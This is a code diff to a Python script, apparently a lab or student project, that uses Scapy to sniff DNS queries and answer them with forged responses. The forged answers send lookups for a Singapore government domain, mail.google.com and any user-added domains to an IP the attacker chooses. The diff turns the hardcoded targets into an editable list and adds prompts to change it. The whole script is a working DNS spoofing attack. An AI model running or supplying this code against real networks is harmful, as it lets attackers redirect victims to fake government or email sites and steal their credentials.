@@ -1,5 +1,7 @@
 from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP
 
+spoof_domains = ["psc.gov.sg", "mail.google.com"]
+
 def dns_responder(dns_ip: str, dns_server_ip, interface):
 
     #local function to foward packets that are not of the domain to spoof
@@ -15,16 +17,12 @@ def dns_responder(dns_ip: str, dns_server_ip, interface):
     def get_response(pkt: IP):
         if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
             
-            if "psc.gov.sg" in str(pkt["DNS Question Record"].qname) or "psc.gov.sg" in pkt["DNS Question Record"].qname.decode('utf-8') :
-                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,rd=1, qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dns_ip)/DNSRR(rrname="psc.gov.sg",rdata=dns_ip))
-                send(spf_resp, interface=interface)
-                return f"Spoofed DNS Response Sent: {pkt[IP].src} {pkt[DNSQR].qname}"
+            for domain in spoof_domains:
+                if domain in str(pkt["DNS Question Record"].qname) or domain in pkt["DNS Question Record"].qname.decode('utf-8') :
+                    spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,rd=1, qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dns_ip)/DNSRR(rrname=domain + ".",rdata=dns_ip))
+                    send(spf_resp, interface=interface)
+                    return f"Spoofed DNS Response Sent: {pkt[IP].src} {pkt[DNSQR].qname}"
                 
-            elif "mail.google.com" in str(pkt["DNS Question Record"].qname) or "mail.google.com" in pkt["DNS Question Record"].qname.decode('utf-8') :
-                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,rd=1, qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dns_ip)/DNSRR(rrname="mail.google.com.",rdata=dns_ip))
-                send(spf_resp, interface=interface)
-                return f"Spoofed DNS Response Sent: {pkt[IP].src} {pkt[DNSQR].qname}"
-
             else:
                 # make DNS query, capturing the answer and send the answer
                 return forward_dns(pkt)
@@ -32,10 +30,35 @@ def dns_responder(dns_ip: str, dns_server_ip, interface):
     return get_response
 
 def main():
+    #Retrieve settings from user
     interface = input("Enter interface to sniff on: ").strip()
     dns_server_ip = input("Enter IP of rogue dns server: ").strip()  # DNS server IP
-
     pkt_filter = f"udp port 53 and ip dst {dns_server_ip}"
+    
+    
+    #Verifying domains to spoof
+    print("Current domains to spoof: ")
+    for domain in spoof_domains:
+        print(domain)
+    
+    add = input("Any domains to add or delete: (y/n)").strip()
+    if add == "y":
+        decision = input("Add (a) OR delete (d) domain").strip()
+        
+        if decision == "a":
+            number_to_add = int(input("How many: ").strip())
+            for i in range(number_to_add):
+                domain = input("Enter domain (without http and www): ").strip()
+                spoof_domains.append(domain)
+        
+        else:
+            number_to_delete = int(input("How many: ").strip())
+            for i in range(number_to_delete):
+                domain = input("Enter domain (without http and www): ").strip()
+                spoof_domains.remove(domain)
+
+    
+    #Start the spoofing
     sniff(filter=pkt_filter, prn=dns_responder(dns_server_ip, dns_server_ip, interface), interface=interface)
 
 
